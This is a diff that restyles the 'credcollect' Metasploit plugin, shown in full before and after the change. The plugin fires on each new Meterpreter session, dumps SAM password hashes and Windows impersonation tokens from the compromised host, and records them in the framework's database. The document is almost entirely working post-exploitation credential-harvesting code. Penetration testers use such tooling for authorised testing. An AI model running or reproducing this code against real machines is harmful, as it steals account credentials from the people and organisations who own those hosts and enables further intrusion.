@@ -1,118 +1,108 @@
-#
-# $Id$
-#
 # credcollect - tebo[at]attackresearch.com
-#
-# $Revision$
-#
 
 module Msf
+  class Plugin::CredCollect < Msf::Plugin
+    include Msf::SessionEvent
 
-class Plugin::CredCollect < Msf::Plugin
-	include Msf::SessionEvent
+    class CredCollectCommandDispatcher
+      include Msf::Ui::Console::CommandDispatcher
 
-	class CredCollectCommandDispatcher
-		include Msf::Ui::Console::CommandDispatcher
+      def name
+        'credcollect'
+      end
 
-		def name
-			"credcollect"
-		end
+      def commands
+        {
+          'db_hashes' => "Dumps hashes (deprecated: use 'creds -s smb')",
+          'db_tokens' => "Dumps tokens (deprecated: use 'notes -t smb_token')"
+        }
+      end
 
-		def commands
-			{
-				"db_hashes" => "Dumps hashes (deprecated: use 'creds -s smb')",
-				"db_tokens" => "Dumps tokens (deprecated: use 'notes -t smb_token')"
-			}
-		end
+      def cmd_db_hashes
+        print_error ''
+        print_error "db_hashes is deprecated. Use 'creds -s smb' instead."
+        print_error ''
+      end
 
-		def cmd_db_hashes()
-			print_error ""
-			print_error "db_hashes is deprecated. Use 'creds -s smb' instead."
-			print_error ""
-		end
+      def cmd_db_tokens
+        print_error ''
+        print_error "db_tokens is deprecated. Use 'notes -t smb_token' instead."
+        print_error ''
+      end
 
-		def cmd_db_tokens()
-			print_error ""
-			print_error "db_tokens is deprecated. Use 'notes -t smb_token' instead."
-			print_error ""
-		end
+    end
 
-	end
+    def on_session_open(session)
+      return if !framework.db.active
 
-	def on_session_open(session)
+      print_status('This is CredCollect, I have the conn!')
 
-		return if not self.framework.db.active
+      if (session.type == 'meterpreter')
 
-		print_status("This is CredCollect, I have the conn!")
+        # Make sure we're rockin Priv and Incognito
+        session.core.use('priv')
+        session.core.use('incognito')
 
-		if (session.type == "meterpreter")
+        # It wasn't me mom! Stinko did it!
+        hashes = session.priv.sam_hashes
 
-			# Make sure we're rockin Priv and Incognito
-			session.core.use("priv")
-			session.core.use("incognito")
+        # Target infos for the db record
+        addr = session.sock.peerhost
+        # This ought to read from the exploit's datastore.
+        # Use the meterpreter script if you need to control it.
+        smb_port = 445
 
-			# It wasn't me mom! Stinko did it!
-			hashes = session.priv.sam_hashes
+        # Record hashes to the running db instance
+        hashes.each do |hash|
+          data = {}
+          data[:host] = addr
+          data[:port] = smb_port
+          data[:sname] = 'smb'
+          data[:user] = hash.user_name
+          data[:pass] = hash.lanman + ':' + hash.ntlm
+          data[:type] = 'smb_hash'
+          data[:active] = true
 
-			# Target infos for the db record
-			addr = session.sock.peerhost
-			# This ought to read from the exploit's datastore.
-			# Use the meterpreter script if you need to control it.
-			smb_port = 445
+          framework.db.report_auth_info(data)
+        end
 
-			# Record hashes to the running db instance
-			hashes.each do |hash|
-				data = {}
-				data[:host]  = addr
-				data[:port]  = smb_port
-				data[:sname] = 'smb'
-				data[:user]  = hash.user_name
-				data[:pass]  = hash.lanman + ":" + hash.ntlm
-				data[:type]  = "smb_hash"
-				data[:active] = true
+        # Record user tokens
+        tokens = session.incognito.incognito_list_tokens(0).values
+        # Meh, tokens come to us as a formatted string
+        tokens = tokens.join.strip!.split("\n")
 
-				self.framework.db.report_auth_info(data)
-			end
+        tokens.each do |token|
+          data = {}
+          data[:host] = addr
+          data[:type] = 'smb_token'
+          data[:data] = token
+          data[:update] = :unique_data
 
-			# Record user tokens
-			tokens = session.incognito.incognito_list_tokens(0).values
-			# Meh, tokens come to us as a formatted string
-			tokens = tokens.join.strip!.split("\n")
+          framework.db.report_note(data)
+        end
+      end
+    end
 
-			tokens.each do |token|
-				data = {}
-				data[:host]      = addr
-				data[:type]      = 'smb_token'
-				data[:data]      = token
-				data[:update]    = :unique_data
+    def on_session_close(session, reason = ''); end
 
-				self.framework.db.report_note(data)
-			end
-		end
-	end
+    def initialize(framework, opts)
+      super
+      self.framework.events.add_session_subscriber(self)
+      add_console_dispatcher(CredCollectCommandDispatcher)
+    end
 
-	def on_session_close(session,reason='')
-	end
+    def cleanup
+      framework.events.remove_session_subscriber(self)
+      remove_console_dispatcher('credcollect')
+    end
 
-	def initialize(framework, opts)
-		super
-		self.framework.events.add_session_subscriber(self)
-		add_console_dispatcher(CredCollectCommandDispatcher)
-	end
+    def name
+      'db_credcollect'
+    end
 
-	def cleanup
-		self.framework.events.remove_session_subscriber(self)
-		remove_console_dispatcher('credcollect')
-	end
+    def desc
+      'Automatically grab hashes and tokens from Meterpreter session events and store them in the database'
+    end
 
-	def name
-		"db_credcollect"
-	end
-
-	def desc
-		"Automatically grabs hashes and tokens from meterpreter session events and stores them in the db"
-	end
-
+  end
 end
-end
-
